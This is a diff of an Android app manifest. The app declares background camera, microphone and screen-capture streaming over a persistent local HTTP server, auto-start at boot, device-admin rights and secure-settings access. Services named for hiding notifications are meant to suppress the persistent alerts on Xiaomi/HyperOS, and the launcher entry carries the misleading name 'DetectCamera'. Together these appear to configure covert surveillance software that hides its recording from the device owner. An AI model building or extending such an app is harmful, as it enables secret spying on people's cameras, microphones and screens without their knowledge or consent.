@@ -19,9 +19,13 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
 
-    <!-- Permisos requeridos para la gestión de notificaciones y ajustes del sistema -->
-    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
-    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" tools:ignore="ProtectedPermissions" />
+    <!-- Permisos para gestión de notificaciones y ajustes del sistema -->
+    <uses-permission
+        android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+
+    <uses-permission
+        android:name="android.permission.WRITE_SECURE_SETTINGS"
+        tools:ignore="ProtectedPermissions" />
 
     <application
         android:allowBackup="true"
@@ -33,37 +37,57 @@
         android:theme="@style/Theme.MaterialComponents.DayNight.NoActionBar"
         tools:ignore="MissingApplicationIcon">
 
+        <!-- ACTIVIDAD PRINCIPAL -->
         <activity
             android:name=".MainActivity"
-            android:exported="true">
+            android:exported="true" />
+
+        <!-- ÚNICA ENTRADA DEL LAUNCHER -->
+        <activity-alias
+            android:name=".PruxLauncher"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@android:drawable/ic_menu_camera"
+            android:roundIcon="@android:drawable/ic_menu_camera"
+            android:label="DetectCamera"
+            android:targetActivity=".MainActivity">
+
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
 
+        </activity-alias>
+
+        <!-- ARRANQUE AUTOMÁTICO -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
             android:exported="true"
             android:directBootAware="true">
+
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
             </intent-filter>
+
         </receiver>
 
+        <!-- SERVIDOR WEB -->
         <service
             android:name=".ServerService"
             android:enabled="true"
             android:exported="false"
             android:stopWithTask="false"
             android:foregroundServiceType="specialUse">
+
             <property
                 android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                 android:value="persistent local HTTP server for user-requested LAN streaming" />
+
         </service>
 
+        <!-- MEDIA PROJECTION -->
         <activity
             android:name=".ProjectionActivity"
             android:exported="true"
@@ -72,52 +96,65 @@
             android:noHistory="true"
             android:launchMode="singleInstance" />
 
+        <!-- CÁMARA / AUDIO / CAPTURA -->
         <service
             android:name=".CameraService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="specialUse|camera|microphone|mediaProjection">
+
             <property
                 android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                 android:value="background streaming and camera service" />
+
         </service>
 
+        <!-- DEVICE ADMIN -->
         <receiver
             android:name=".AdminReceiver"
             android:description="@string/app_name"
             android:label="@string/app_name"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
             android:exported="true">
+
             <meta-data
                 android:name="android.app.device_admin"
                 android:resource="@xml/device_admin_policies" />
+
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
             </intent-filter>
+
         </receiver>
 
-        <!-- SERVICIO LISTENER DE NOTIFICACIONES -->
+        <!-- NOTIFICATION LISTENER -->
         <service
             android:name=".NotificationHiderService"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:exported="true">
+
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
+
         </service>
 
-        <!-- SERVICIO DE ACCESIBILIDAD PARA OCULTAR NOTIFICACIONES PERSISTENTES EN HYPEROS/XIAOMI -->
+        <!-- ACCESSIBILITY -->
         <service
             android:name=".AdbDismissService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true">
+
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
+
             <meta-data
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
+
         </service>
 
     </application>
+
 </manifest>
